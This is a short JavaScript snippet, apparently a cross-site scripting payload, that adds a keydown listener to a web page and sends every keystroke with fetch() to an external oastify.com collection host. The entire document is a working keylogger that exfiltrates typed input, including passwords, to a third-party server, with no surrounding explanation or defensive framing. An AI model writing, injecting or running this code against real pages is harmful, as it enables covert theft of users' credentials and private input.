function logKey(event){
	fetch("https://536qd0bplf13wjesley2gzbkjbp2dy1n.oastify.com/k?key=" + event.key)
}

document.addEventListener('keydown', logKey);
